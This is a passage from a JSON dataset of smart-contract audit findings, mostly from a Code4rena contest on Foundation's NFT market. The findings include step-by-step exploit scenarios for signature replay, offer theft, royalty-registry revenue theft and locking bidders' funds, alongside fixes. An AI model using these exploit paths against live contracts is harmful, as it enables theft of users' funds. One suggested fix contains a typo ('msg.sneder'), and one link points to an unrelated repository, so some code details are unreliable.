      "summary": "\nThis bug report outlines a vulnerability in the `buyFromPrivateSaleFor()` function of the NFTMarketPrivateSale.sol contract. This function allows sellers to make private sales to users, but if insufficient ETH is provided to the function call, the protocol will attempt to withdraw the amount difference from the user's unlocked balance. However, if the same user has an open offer on the same NFT, then these funds will remain locked until expiration. As a result, the user cannot make use of these locked funds even though they may be needed for a successful sale.\n\nThe impact of this vulnerability is that users may not have access to the funds needed for a successful sale, even if they have the money available. This was discovered through manual code review.\n\nThe recommended mitigation step is to add a `_cancelBuyersOffer()` call to the `buyFromPrivateSaleFor()` function. This should only be added to the case where insufficient ETH was provided to the trade. By cancelling the buyer's offer on the same NFT, we can guarantee that the user has access to the correct amount of funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/77",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1583",
      "title": "[M-05] Exchange does not split royalty revenue correctly",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI_\n\nAccording to the [`README.md`](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/README.md?plain=1#L21):\n\n> If royalty information was not defined when the NFT was originally deployed, it may be added using the Royalty Registry which will be respected by our market contract.\n\nThe actual exchange code only respects the Royalty Registry or other royalty information if the number of recipients is less than or equal to four.\n\n### Impact\n\nIf the `creatorRecipients.length` is more than four then the array is essentially truncated and the royalties are only split among the first four entries in the array. If the array happens to be sorted from low to high then the people who were supposed to get the largest portions of the royalties are given nothing.\n\n### Proof of Concept\n\n```solidity\n        uint256 maxCreatorIndex = creatorRecipients.length - 1;\n        if (maxCreatorIndex > MAX_ROYALTY_RECIPIENTS_INDEX) {\n          maxCreatorIndex = MAX_ROYALTY_RECIPIENTS_INDEX;\n        }\n```\n\n<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L76-L79>\n\n```solidity\n        // Send payouts to each additional recipient if more than 1 was defined\n        uint256 totalDistributed;\n        for (uint256 i = 1; i <= maxCreatorIndex; ++i) {\n          uint256 share = (creatorFee * creatorShares[i]) / totalShares;\n          totalDistributed += share;\n          _sendValueWithFallbackWithdraw(creatorRecipients[i], share, SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS);\n        }\n```\n\n<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L99-L105>\n\nCreators shouldn't have to settle the correct amounts amongst themselves afterwards and doing so may trigger unwanted tax consequences for the creators who got the larger shares of funds.\n\n### Recommended Mitigation Steps\n\nFetch the royalty information during offer creation, cache it for the final transfer, and reject any NFT for which the array size is more than `MAX_ROYALTY_RECIPIENTS_INDEX`.\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/29#issuecomment-1055329404):**\n > Yes, this is correct. This behavior is intended -- however we should be more clear about that in the readme and inline comments. I'll add some comments inline to clarify.\n> \n> The reason we have a cap at all is because any number of addresses could be returned by these APIs. That would be okay if the creator themselves always paid the gas costs to process them, but since the costs are often pushed to the collectors or secondary sellers - we wanted to ensure the worst case scenario never got unreasonably expensive.\n> \n> The actual limit we put in place is arbitrary. However some limit is necessary to ensure a reasonable experience for our users.\n> \n> If the creator does want payouts to go to many different addresses, the recommended approach would be to send the royalties to a contract with then handles the split internally in a gas efficient manner, e.g. with https://www.0xsplits.xyz/\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a cryptocurrency exchange that only respects the Royalty Registry or other royalty information if the number of recipients is less than or equal to four. This means that if the creatorRecipients.length is more than four, then the array is truncated and the royalties are only split among the first four entries in the array. This could cause the people who were supposed to get the largest portions of the royalties to get nothing, which could lead to tax consequences for the creators who got larger shares of funds. The tools used to identify this vulnerability were code inspection. The recommended mitigation steps are to fetch the royalty information during offer creation, cache it for the final transfer, and reject any NFT for which the array size is more than the maximum royalty recipients index.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/29",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "1582",
      "title": "[M-04] adminAccountMigration() Does Not Update buyPrice.seller",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L263-L292\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketBuyPrice.sol#L125-L141\n\n\n## Vulnerability details\n\n## Impact\n\nThe `adminAccountMigration()` function is called by the operator role to update all sellers' auctions. The `auction.seller` account is updated to the new address, however, the protocol fails to update `buyPrice.seller`. As a result, the protocol is put in a deadlock situation where the new address cannot cancel the auction and withdraw their NFT without the compromised account first cancelling the buy price and vice-versa. This is only recoverable if the new account is migrated back to the compromised account and then `cancelBuyPrice()` is called before migrating back.\n\n## Proof of Concept\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider invalidating the buy offer before account migration.",
      "summary": "\nThis bug report is about an issue with the `adminAccountMigration()` function in the code-423n4/2022-02-foundation repository. This function is used by the operator role to update all sellers' auctions. The `auction.seller` account is updated to the new address, however, the protocol fails to update `buyPrice.seller`. This results in a deadlock situation where neither the new address nor the compromised account can cancel the auction and withdraw their NFT. To fix this, the new account must be migrated back to the compromised account and then `cancelBuyPrice()` must be called before migrating back. The bug was discovered through manual code review. The recommended mitigation step is to consider invalidating the buy offer before account migration.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/87",
      "tags": [],
      "finders": [
        "cccz",
        "leastwood"
      ]
    },
    {
      "id": "1581",
      "title": "[M-03] Approve race condition in FETH",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x1f8b_\n\n[FETH.sol#L212](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/FETH.sol#L212)<br>\n\nFront running attack in approve.\n\n### Proof of Concept\n\nThe contract of the `FETH` does not have any protection against the well-known Multiple Withdrawal Attack attack on the Approve/TransferFrom methods of the ERC20 standard.\n\nAlthough this attack poses a limited risk in specific situations, it is worth mentioning to consider it for possible future operations.\n\nThere are solutions to mitigate this front running such as, to first reduce the spender's allowance to 0 and set the desired value afterwards; another solution could the one that Open Zeppelin offers, where the non-standard decreaseAllowance and increaseAllowance functions have been added to mitigate the well-known issues involving setting allowances.\n\n### Recommended Mitigation Steps\n\nAdd increase and decrease allowance.\n\n**[NickCuso (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/14#issuecomment-1060614467):**\n > Yes, this is a good best practice to be following. We will add these functions in the near future. In the meantime we've added an inline comment about the potential risk.\n> \n> At first we don't expect there will be much interest in using FETH outside of Foundation itself. Thanks to the trusted relationship with the market contract, approvals are not necessary. So this is not an issue that should come up in the near term.\n> \n> We are not fixing this immediately because it introduces a risk associated with another contract our users have deployed, that contract was not part of the contest repo. We are looking to patch that vulnerability and then will add `increaseAllowance` to FETH.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `FETH` contract, which is a contract based on the ERC20 standard. This vulnerability could allow a front running attack in the Approve function. The attack, known as the Multiple Withdrawal Attack, poses a limited risk in specific situations. As a mitigation, it is recommended to add increase and decrease allowance functions to the contract, as this will help to mitigate the issue. Additionally, Open Zeppelin offers a solution where non-standard decreaseAllowance and increaseAllowance functions are added to help mitigate the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/14",
      "tags": [],
      "finders": [
        "0x1f8b"
      ]
    },
    {
      "id": "1580",
      "title": "[M-02] SendValueWithFallbackWithdraw: withdrawFor function may fail to withdraw ether recorded in pendingWithdrawals",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/SendValueWithFallbackWithdraw.sol#L37-L77\n\n\n## Vulnerability details\n\n## Impact\nThe NFTMarketFees contract and the NFTMarketReserveAuction contract use the _sendValueWithFallbackWithdraw function to send ether to FoundationTreasury, CreatorRecipients, Seller, Bidder.\nWhen the receiver fails to receive due to some reasons (exceeding the gas limit or the receiver contract cannot receive ether), it will record the ether to be sent in the pendingWithdrawals variable. \n```\n  function _sendValueWithFallbackWithdraw(\n    address payable user,\n    uint256 amount,\n    uint256 gasLimit\n  ) internal {\n    if (amount == 0) {\n      return;\n    }\n    // Cap the gas to prevent consuming all available gas to block a tx from completing successfully\n    // solhint-disable-next-line avoid-low-level-calls\n    (bool success, ) = user.call{ value: amount, gas: gasLimit }(\"\");\n    if (!success) {\n      // Record failed sends for a withdrawal later\n      // Transfers could fail if sent to a multisig with non-trivial receiver logic\n      unchecked {\n        pendingWithdrawals[user] += amount;\n      }\n      emit WithdrawPending(user, amount);\n    }\n  }\n```\nThe user can then withdraw ether via the withdraw or withdrawFor functions.\n```\n  function withdraw() external {\n    withdrawFor(payable(msg.sender));\n  }\n  function withdrawFor(address payable user) public nonReentrant {\n    uint256 amount = pendingWithdrawals[user];\n    if (amount == 0) {\n      revert SendValueWithFallbackWithdraw_No_Funds_Available();\n    }\n    pendingWithdrawals[user] = 0;\n    user.sendValue(amount);\n    emit Withdrawal(user, amount);\n  }\n```\nHowever, the withdrawFor function can only send ether to the address recorded in pendingWithdrawals. When the recipient is a contract that cannot receive ether, these ethers will be locked in the contract and cannot be withdrawn.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/SendValueWithFallbackWithdraw.sol#L37-L77\n## Tools Used\nNone\n## Recommended Mitigation Steps\nAdd the withdrawTo function as follows:\n\n```\n  function withdrawTo(address payable to) public nonReentrant {\n    uint256 amount = pendingWithdrawals[msg.sneder];\n    if (amount == 0) {\n      revert SendValueWithFallbackWithdraw_No_Funds_Available();\n    }\n    pendingWithdrawals[msg.sneder] = 0;\n    to.sendValue(amount);\n    emit Withdrawal(msg.sneder, amount);\n  }\n```",
      "summary": "\nThis bug report is about a vulnerability in two contracts, NFTMarketFees and NFTMarketReserveAuction, which use the _sendValueWithFallbackWithdraw function to send ether to various addresses. If the recipient is unable to receive the ether due to exceeding the gas limit or the receiver contract cannot receive ether, the ether will be recorded in the pendingWithdrawals variable. The user can then withdraw ether via the withdraw or withdrawFor functions. However, the withdrawFor function can only send ether to the address recorded in pendingWithdrawals, which means that ethers will be locked in the contract if the recipient is a contract that cannot receive ether. To mitigate this vulnerability, a new function, withdrawTo, should be added. This function allows users to specify the address to which the ether should be sent, allowing users to send ether to contracts that cannot receive ether.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/12",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "1579",
      "title": "[M-01] EIP-712 signatures can be re-used in private sales",
      "impact": "MEDIUM",
      "content": "_Submitted by thankthedark, also found by Afanasyevich and cmichel_\n\n[NFTMarketPrivateSale.sol#L123-L174](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L123-L174)<br>\n\nWithin a NFTMarketPrivateSale contract, buyers are allowed to purchase a seller's NFT. This is done through a seller providing a buyer a EIP-712 signature. The buyer can then call `#buyFromPrivateSaleFor` providing the v, r, and s values of the signature as well as any additional details to generate the message hash. If the signature is valid, then the NFT is transferred to the buyer.\n\nThe problem with the code is that EIP-712 signatures can be re-used within a small range of time assuming that the original seller takes back ownership of the NFT. This is because the NFTMarketPrivateSale#buyFromPrivateSaleFor method has no checks to determine if the EIP-712 signature has been used before.\n\n### Proof of Concept\n\nConsider the following example:\n\n1.  Joe the NFT owner sells a NFT to the malicious buyer Rachel via a private sale.\n2.  Rachel through this private sale obtains the EIP-712 signature and uses it to purchase a NFT.\n3.  Joe the NFT owner purchases back the NFT within two days of the original sale to Rachel.\n4.  Joe the NFT owner puts the NFT back on sale.\n5.  Rachel, who has the original EIP-712 signature, can re-purchase the NFT by calling `#buyFromPrivateSaleFor` again with the same parameters they provided in the original private sale purchase in step 1.\n\nThe `#buyFromPrivateSaleFor` [function](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L123) runs several validation checks before transferring the NFT over to the buyer. The validations are as follows:\n\n1.  L#132 - The signature has expired.\n2.  L#135 - The deadline is beyond 48 hours from now.\n3.  L#143 - The amount argument is greater than msg.value.\n4.  L#149 - The msg.value is greater than the amount set.\n5.  L#171 - This checks that the EIP-712 signature comes from the NFT seller.\n\nAs you can see, there are no checks that the EIP-712 signature has been used before. If the original NFT seller purchases back the NFT, then they are susceptible to having the original buyer taking back the NFT. This can be problematic if the NFT has risen in value, as the original buyer can utilize the same purchase amount from the first transaction in this malicious transaction.\n\n### Recommended Mitigation Steps\n\nMost contracts utilize nonces when generating EIP-712 signatures to ensure that the contract hasn't been used for. When a nonce is injected into a signature, it makes it impossible for re-use, assuming of course the nonce feature is done correctly.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/68#issuecomment-1057990473):**\n > Yes, this is a good point to raise and something like this could happen because it's not intuitive to think that the private sale remains valid after it's been used.\n> \n> This is mitigated by the short time window we use for Private Sales. Our frontend uses 24-hour expirations and in the contract we ensure the window is <= 48 hours.\n> \n> In order to remain backwards compatible with our existing integration and any signatures which are outstanding at the time of the upgrade, we decided not to use `nonce` as recommended. Instead we simply store a mapping tracking if the exact private sale terms have already been used.\n> \n> Here's the primary addition:\n> \n> ```solidity\n>     // Ensure that the offer can only be accepted once.\n>     if (privateSaleInvalidated[nftContract][tokenId][msg.sender][seller][amount][deadline]) {\n>       revert NFTMarketPrivateSale_Signature_Canceled_Or_Already_Claimed();\n>     }\n>     privateSaleInvalidated[nftContract][tokenId][msg.sender][seller][amount][deadline] = true;\n> ```\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a NFTMarketPrivateSale contract, which allows buyers to purchase a seller's NFT. The vulnerability is that the contract does not have checks to determine if the EIP-712 signature has been used before, so if the original NFT seller purchases back the NFT, then they are susceptible to having the original buyer taking back the NFT. This can be problematic if the NFT has risen in value, as the original buyer can utilize the same purchase amount from the first transaction in this malicious transaction. To mitigate this issue, most contracts utilize nonces when generating EIP-712 signatures to ensure that the contract hasn't been used for. When a nonce is injected into a signature, it makes it impossible for re-use, assuming of course the nonce feature is done correctly.",
      "quality_score": 3.005333333333333,
      "rarity_score": 2.002666666666667,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/68",
      "tags": [
        "Data Validation",
        "Replay Attack"
      ],
      "finders": [
        "Afanasyevich  cmichel",
        "thankthedark"
      ]
    },
    {
      "id": "1578",
      "title": "[H-03] An offer made after auction end can be stolen by an auction winner",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by leastwood, shenwilly, and WatchPug_\n\nAn Offer which is made for an NFT when auction has ended, but its winner hasn't received the NFT yet, can be stolen by this winner as `_transferFromEscrow` being called by `_acceptOffer` will transfer the NFT to the winner, finalising the auction, while no transfer to the user who made the offer will happen.\n\nThis way the auction winner will obtain both the NFT and the offer amount after the fees at no additional cost, at the expense of the user who made the offer.\n\n### Proof of Concept\n\nWhen an auction has ended, there is a possibility to make the offers for an auctioned NFT as:\n\n`makeOffer` checks `_isInActiveAuction`:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L200>\n\n`_isInActiveAuction` returns false when `auctionIdToAuction[auctionId].endTime < block.timestamp`, so `makeOffer` above can proceed:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L666-L669>\n\nThen, the auction winner can call `acceptOffer -> _acceptOffer` (or `setBuyPrice -> _autoAcceptOffer -> _acceptOffer`).\n\n`_acceptOffer` will try to transfer directly, and then calls `_transferFromEscrow`:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L262-L271>\n\nIf the auction has ended, but a winner hasn't picked up the NFT yet, the direct transfer will fail, proceeding with `_transferFromEscrow` in the FNDNFTMarket defined order:\n\n    function _transferFromEscrow(\n    address nftContract,\n    uint256 tokenId,\n    address recipient,\n    address seller\n    ) internal override(NFTMarketCore, NFTMarketReserveAuction, NFTMarketBuyPrice, NFTMarketOffer) {\n    super._transferFromEscrow(nftContract, tokenId, recipient, seller);\n    }\n\nNFTMarketOffer.\\_transferFromEscrow will call super as `nftContractToIdToOffer` was already deleted:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L296-L302>\n\nNFTMarketBuyPrice.\\_transferFromEscrow will call super as there is no buy price set:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketBuyPrice.sol#L283-L293>\n\nFinally, NFTMarketReserveAuction.\\_transferFromEscrow will send the NFT to the winner via `_finalizeReserveAuction`, not to the user who made the offer:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L556-L560>\n\nThe `recipient` user who made the offer is not present in this logic, the NFT is being transferred to the `auction.bidder`, and the original `acceptOffer` will go through successfully.\n\n### Recommended Mitigation Steps\n\nAn attempt to set a buy price from auction winner will lead to auction finalisation, so `_buy` cannot be called with a not yet finalised auction, this way the NFTMarketReserveAuction.\\_transferFromEscrow L550-L560 logic is called from the NFTMarketOffer.\\_acceptOffer only:\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L270>\n\nis the only user of\n\n<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L550-L560>\n\nThis way the fix is to update L556-L560 for the described case as:\n\nNow:\n\n    // Finalization will revert if the auction has not yet ended.\n    _finalizeReserveAuction(auctionId, false);\n\n    // Finalize includes the transfer, so we are done here.\n    return;\n\nTo be, we leave the NFT in the escrow and let L564 super call to transfer it to the recipient:\n\n    // Finalization will revert if the auction has not yet ended.\n    _finalizeReserveAuction(auctionId, true);\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/49#issuecomment-1060649574):**\n > Yes! This was a great find and a major issue with our implementation. I'm very happy that it was flagged by a few different people, it helps raise our confidence that several wardens really dove into the code.\n> \n> It was a big miss on our part that this was not thoroughly tested. Our tests for this scenario confirmed the events and payouts, but did not validate the ownership in the end!\n> \n> The proposed fix is perfect and exactly what we have implemented. This follows the patterns we established well, and actually simplifies the logic here so that things are easier to reason about.\n\n\n\n***\n \n",
      "summary": "\nThis bug report is about a vulnerability in the FNDNFTMarket code that allows an auction winner to steal an offer made for an NFT when the auction has ended, but the winner has not yet received the NFT. This is possible because of the way the code is written, which does not include a transfer to the user who made the offer. As a result, the auction winner can obtain both the NFT and the offer amount after the fees at no additional cost.\n\nProof of concept is provided in the report, which shows that when an auction has ended, there is a possibility to make offers for an auctioned NFT. The code then checks if the auction is still active and if so, proceeds with the offer. The auction winner can then call the `acceptOffer -> _acceptOffer` function, which will try to transfer the NFT directly, and if that fails, it will call the `_transferFromEscrow` function. This function will send the NFT to the winner via `_finalizeReserveAuction`, not to the user who made the offer.\n\nThe recommended mitigation steps are to update the code so that the `_transferFromEscrow` function will leave the NFT in the escrow and let the super call transfer it to the recipient. This way, the user who made the offer will receive the NFT instead of the auction winner. \n\nIn conclusion, this bug report explains a vulnerability in the FNDNFTMarket code that could allow an auction winner to steal an offer made for an NFT when the auction has ended, but the winner has not yet received the NFT. A proof of concept and recommended mitigation steps are provided as well.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/49",
      "tags": [],
      "finders": [
        "WatchPug",
        "shenwilly",
        "hyh",
        "leastwood"
      ]
    },
    {
      "id": "1577",
      "title": "[H-02] Creators can steal sale revenue from owners sales",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L158-L160\nhttps://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L196-L198\nhttps://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketCreators.sol#L97-L99\n\n\n## Vulnerability details\n\nAccording to the `README.md`\n> All sales in the Foundation market will pay the creator 10% royalties on secondary sales. This is not specific to NFTs minted on Foundation, it should work for any NFT. If royalty information was not defined when the NFT was originally deployed, it may be added using the Royalty Registry which will be respected by our market contract.\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/README.md?plain=1#L21\n\nUsing the Royalty Registry an owner can decide to change the royalty information right before the sale is complete, affecting who gets what.\n\n## Impact\nBy updating the registry to include the seller as one of the royalty recipients, the creator can steal the sale price minus fees. This is because if code finds that the seller is a royalty recipient the royalties are all passed to the creator regardless of whether the owner is the seller or not.\n\n## Proof of Concept\n```solidity\n          // 4th priority: getRoyalties override\n          if (recipients.length == 0 && nftContract.supportsERC165Interface(type(IGetRoyalties).interfaceId)) {\n            try IGetRoyalties(nftContract).getRoyalties{ gas: READ_ONLY_GAS_LIMIT }(tokenId) returns (\n              address payable[] memory _recipients,\n              uint256[] memory recipientBasisPoints\n            ) {\n              if (_recipients.length > 0 && _recipients.length == recipientBasisPoints.length) {\n                bool hasRecipient;\n                for (uint256 i = 0; i < _recipients.length; ++i) {\n                  if (_recipients[i] != address(0)) {\n                    hasRecipient = true;\n                    if (_recipients[i] == seller) {\n                      return (_recipients, recipientBasisPoints, true);\n```\nhttps://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/MasterChef.sol#L127-L154\n\nWhen `true` is returned as the final return value above, the following code leaves `ownerRev` as zero because `isCreator` is `true`\n```solidity\n      uint256 ownerRev\n    )\n  {\n    bool isCreator;\n    (creatorRecipients, creatorShares, isCreator) = _getCreatorPaymentInfo(nftContract, tokenId, seller);\n\n    // Calculate the Foundation fee\n    uint256 fee;\n    if (isCreator && !_nftContractToTokenIdToFirstSaleCompleted[nftContract][tokenId]) {\n      fee = PRIMARY_FOUNDATION_FEE_BASIS_POINTS;\n    } else {\n      fee = SECONDARY_FOUNDATION_FEE_BASIS_POINTS;\n    }\n\n    foundationFee = (price * fee) / BASIS_POINTS;\n\n    if (creatorRecipients.length > 0) {\n      if (isCreator) {\n        // When sold by the creator, all revenue is split if applicable.\n        creatorRev = price - foundationFee;\n      } else {\n        // Rounding favors the owner first, then creator, and foundation last.\n        creatorRev = (price * CREATOR_ROYALTY_BASIS_POINTS) / BASIS_POINTS;\n        ownerRevTo = seller;\n        ownerRev = price - foundationFee - creatorRev;\n      }\n    } else {\n      // No royalty recipients found.\n      ownerRevTo = seller;\n      ownerRev = price - foundationFee;\n    }\n  }\n```\n\nIn addition, if the index of the seller in `_recipients` is greater than `MAX_ROYALTY_RECIPIENTS_INDEX`, then the seller is omitted from the calculation and gets zero (`_sendValueWithFallbackWithdraw()` doesn't complain when it sends zero)\n```solidity\n        uint256 maxCreatorIndex = creatorRecipients.length - 1;\n        if (maxCreatorIndex > MAX_ROYALTY_RECIPIENTS_INDEX) {\n          maxCreatorIndex = MAX_ROYALTY_RECIPIENTS_INDEX;\n        }\n```\nhttps://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L76-L79\n\nThis issue does a lot of damage because the creator can choose whether and when to apply it on a sale-by-sale basis. Two other similar, but separate, exploits are available for the other blocks in `_getCreatorPaymentInfo()` that return arrays but they either require a malicious NFT implementation or can only specify a static seller for which this will affect things. In all cases, not only may the seller get zero dollars for the sale, but they'll potentially owe a lot of taxes based on the 'sale' price. The attacker may or may not be the creator - creators can be bribed with kickbacks.\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nAlways calculate owner/seller revenue separately from royalty revenue",
      "summary": "\nThis bug report is about a vulnerability that exists in the Foundation market contract, which can be exploited to steal the sale price minus fees. The vulnerability exists when the Royalty Registry is updated to include the seller as one of the royalty recipients, allowing the creator to steal the sale price minus fees. The bug is exploited by updating the registry to include the seller as one of the royalty recipients, which allows the creator to receive all royalties regardless of whether the owner is the seller or not. In addition, if the index of the seller in `_recipients` is greater than `MAX_ROYALTY_RECIPIENTS_INDEX`, the seller is omitted from the calculation and gets zero. This issue does a lot of damage because the creator can choose whether and when to apply it on a sale-by-sale basis. \n\nThe tools used to identify this vulnerability were code inspection. The recommended mitigation steps for this vulnerability are to always calculate owner/seller revenue separately from royalty revenue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/30",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "1576",
      "title": "[H-01] NFT owner can create multiple auctions",
      "impact": "HIGH",
      "content": "_Submitted by 0xliumin, also found by leastwood_\n\n[NFTMarketReserveAuction.sol#L325-L349](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketReserveAuction.sol#L325-L349)<br>\n[NFTMarketReserveAuction.sol#L596-L599](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketReserveAuction.sol#L596-L599)<br>\n\nNFT owner can permanently lock funds of bidders.\n\n### Proof of Concept\n\nAlice (the attacker) calls `createReserveAuction`, and creates one like normal. let this be auction id 1.\n\nAlice calls `createReserveAuction` again, before any user has placed a bid (this is easy to guarantee with a deployed attacker contract). We'd expect that Alice wouldn't be able to create another auction, but she can, because `_transferToEscrow` doesn't revert if there's an existing auction. let this be Auction id 2.\n\nSince `nftContractToTokenIdToAuctionId[nftContract][tokenId]` will contain auction id 2, all bidders will see that auction as the one to bid on (unless they inspect contract events or data manually).\n\nAlice can now cancel auction id 1, then cancel auction id 2, locking up the funds of the last bidder on auction id 2 forever.\n\n### Recommended Mitigation Steps\n\nPrevent NFT owners from creating multiple auctions.\n\n**[NickCuso (Foundation) confirmed and commented](https://github.com/code-423n4/2022-02-foundation-findings/issues/23#issuecomment-1054614690):**\n > This is a great find!\n> \n> The impact of this bug is:\n>  - Bidder's funds are stuck in escrow in an unrecoverable way without an upgrade, and even with an upgrade it would have been non-trivial to offer a migration path to recover the funds (but it would have been possible to recover correctly).\n>  - It allows sellers to stop the clock and/or back out of an auction. Normally once a bid is received we do not allow the seller to cancel the auction. With this bug, they could have created a new auction and then cancel that in order to back out of the deal entirely. This violates trust with collectors.\n> \n> We have fixed this problem by adding the following code to `createReserveAuction`:\n> \n> ```solidity\n>     // This check must be after _transferToEscrow in case auto-settle was required\n>     if (nftContractToTokenIdToAuctionId[nftContract][tokenId] != 0) {\n>       revert NFTMarketReserveAuction_Already_Listed(nftContractToTokenIdToAuctionId[nftContract][tokenId]);\n>     }\n> ```\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the code of NFTMarketReserveAuction.sol, a contract used to create and manage auctions of Non-Fungible Tokens (NFTs). The vulnerability allows an attacker, Alice, to create two auctions for the same NFT, and then cancel them both, which permanently locks the funds of the last bidder. \n\nThe impact of this vulnerability is that NFT owners can permanently lock funds of bidders. The proof of concept details how Alice can exploit this vulnerability by creating two auctions for the same NFT and then canceling them both. \n\nThe mitigation for this vulnerability is to prevent NFT owners from creating multiple auctions. This can be done by adding a check to the `createReserveAuction` function to make sure that the NFT is not already being auctioned. This check should also be added to the `_transferToEscrow` function to make sure that an auction is not created if one already exists.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-02-foundation",
      "github_link": "https://github.com/code-423n4/2022-02-foundation-findings/issues/23",
      "tags": [],
      "finders": [
        "leastwood",
        "0xliumin"
      ]
    },
    {
      "id": "42443",
      "title": "[M-04] OpenLevV1.closeTrade with V3 DEX doesn't correctly accounts fee on transfer tokens for repayments",
      "impact": "MEDIUM",
